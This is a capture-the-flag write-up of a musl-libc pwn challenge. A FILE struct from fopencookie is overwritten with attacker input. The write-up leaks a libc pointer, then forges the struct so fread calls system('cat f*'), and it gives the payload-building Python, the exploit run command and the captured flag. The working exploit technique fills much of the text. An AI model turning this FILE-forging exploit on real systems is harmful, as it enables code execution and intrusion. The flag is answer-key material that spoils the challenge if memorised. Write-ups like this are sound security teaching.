# fsiiiul — MetaCTF 2026 (pwn, 250)

> **Flag:** `SkillBit{anotherfsopbutcchesssyheheheh~~~~}`

*"Another quiet little service, back for a second look. It prints one line, takes
whatever you send it, and swears the crash from last time is gone for good. The
person who wrote it has been staring at the same screen for a week and that
segmentation fault still will not go away."*

A musl-libc **File-Structure-Oriented-Programming (FSOP)** challenge built around
`fopencookie`. The name is `fscanf`/`FILE`-flavored, and the flag confirms it:
*"another fsop"*.

---

## 1. Recon

```
challenge: ELF 64-bit PIE, x86-64, interpreter /lib/ld-musl-x86_64.so.1, not stripped
libc.so: musl libc 1.2.5-git-106-gff441c9d
```

The Docker build patches the binary's interpreter to the shipped musl:

```dockerfile
RUN patchelf --set-interpreter /app/libc.so /app/challenge
```

and serves it under socat:

```sh
exec socat TCP-LISTEN:8080,reuseaddr,fork EXEC:/app/challenge,stderr
```

So the target is **musl**, not glibc — the `FILE` layout and exploitation path are
musl's.

## 2. The bug

`main` builds a custom stream with `fopencookie` and immediately leaks a pointer:

```c
cookie_io_functions_t memfile_func = {
 .read = read_xfraud, .write = write_xfraud, .seek = NULL, .close = NULL};
FILE *fp = fopencookie(&cookie, "w", memfile_func);

// "the write handler ... the ninth pointer in the structure"
printf("stream write handler: %p\n", ((void **)fp)[9]);

char buffer[0xe0] = {0x0};
size_t initial = read_chunk(fp, 0xe0); // <-- reads attacker bytes INTO fp
fread(buffer, 0x1, 0x20, fp); // <-- triggers the read path on fp
size_t final = read_chunk(fp, 0xe0);
fflush(fp);
```

`read_chunk(dst, len)` is a `poll`-based loop that reads up to `len` bytes from
`STDIN` into `dst`. The fatal detail: **`dst` is `fp` itself** — the `FILE`
object. So `read_chunk(fp, 0xe0)` overwrites the entire musl `_IO_FILE` struct
with attacker-controlled data. `fread(..., fp)` then drives musl's read machinery
over our forged struct.

`read_chunk` is the "fix" the flavor text mentions: it was added to reassemble a
chunk split across two TCP segments. It blocks (`poll(-1)`) for the first byte
then waits only `IDLE_MS = 100 ms` for the rest — which is why a half-delivered
struct still crashes (`fread` on a corrupt `FILE`): *"that segmentation fault
still will not go away."*

## 3. Leak — defeating ASLR

musl's `_IO_FILE` (relevant fields, offsets on x86-64):

| off | field |
|------|---------------------------------|
| 0x00 | `flags` (+ 4-byte hole) |
| 0x08 | `rpos` |
| 0x10 | `rend` |
| 0x18 | `close` |
| 0x20 | `wend` |
| 0x28 | `wpos` |
| 0x38 | `wbase` |
| 0x40 | `read` ← handler called by `fread` |
| 0x48 | `write` ← `((void**)fp)[9]` |
| 0x88 | `mode` |
| 0x8c | `lock` |

`((void**)fp)[9]` is offset `0x48` = `f->write`. For a cookie stream musl sets
this to its internal `cookiewrite`, so the leak is `libc_base + 0x54de0`:

```
libc_base = leak - 0x54de0 # cookiewrite
system = libc_base + 0x4955a
```

Both offsets verified against the shipped `libc.so` (`nm`).

## 4. The trigger — `fread` → `system("cat f*")`

`fread` with no buffered data calls `__toread(f)` then `f->read(f, buf, len)`.
We forge the struct so:

- `rpos == rend == 0` → no buffered bytes, fall through to the read handler.
- `wpos == wbase == 0` → `__toread` doesn't try to flush a write buffer.
- `f->read = system` at `0x40`.
- `mode = 0`, `lock = -1` at `0x88/0x8c` → skip locking (single-threaded path).
- offset `0x00` holds the command string `"cat f*"` (≤ 8 bytes, fits `flags`+hole).

Because musl calls `f->read(f, …)`, the **first argument is `f` itself**, which
points at our command string. Result: `system("cat f*")`.

## 5. The real-world snag: the listener is TLS-wrapped

The endpoint (`<hex>.live.sbhost.io:1337`) completed the TCP handshake but sent
**zero bytes** — the banner is printed *before* any input is read and stdout is
unbuffered, so this couldn't be a timing/segmentation issue. The DNS pointed at
an AWS ELB:

```
openssl s_client -connect <host>:1337 → CN=*.live.sbhost.io (Let's Encrypt)
```

The listener is **TLS-terminating**: it was silently waiting for a ClientHello.
Raw TCP "looked dead." Connecting with TLS + SNI made the banner appear and the
exploit landed first try:

```python
io = remote(host, port, ssl=True, sni=host)
```

## 6. Exploit

See [`exploit.py`](exploit.py). Core payload:

```python
def build(cmd, system_addr):
 p = bytearray(0xe0)
 p[0:len(cmd)] = cmd # "cat f*" @ 0 (arg to system)
 struct.pack_into('<Q', p, 0x40, system_addr) # f->read -> system
 struct.pack_into('<i', p, 0x88, 0) # mode = 0
 struct.pack_into('<i', p, 0x8c, -1) # lock < 0 -> skip locking
 return bytes(p) # rpos/rend/wpos/wbase stay 0
```

Payload is sent in **one `write`** (224 bytes = one TCP segment) so `read_chunk`
reassembles it inside the 100 ms window and `fread` runs on a fully-written
struct.

Run:

```bash
python3 exploit.py remote 57c4c8f13f38e13c.live.sbhost.io 1337
```

```
[*] leak cookiewrite = 0x7fe6a1914de0
[*] libc base = 0x7fe6a18c0000
[*] system = 0x7fe6a190955a
---OUTPUT---
SkillBit{anotherfsopbutcchesssyheheheh~~~~}
```

## 7. Takeaways

- **musl FSOP**: overwriting a `FILE` struct and letting a `fread`/`fwrite` call
 the `read`/`write` handler is the musl analogue of glibc vtable FSOP. The
 handler receives `FILE*` as its first argument, so stashing a command string at
 offset 0 turns `f->read = system` into `system(cmd)`.
- **`read_chunk(fp, …)` reading into the `FILE` object** is the entire bug — a
 "network reassembly fix" that writes straight over the stream.
- **Infra matters**: a pwn service that "accepts the connection but says nothing"
 may be behind a TLS-terminating load balancer. `openssl s_client` /
 `ssl=True` before concluding the instance is dead.
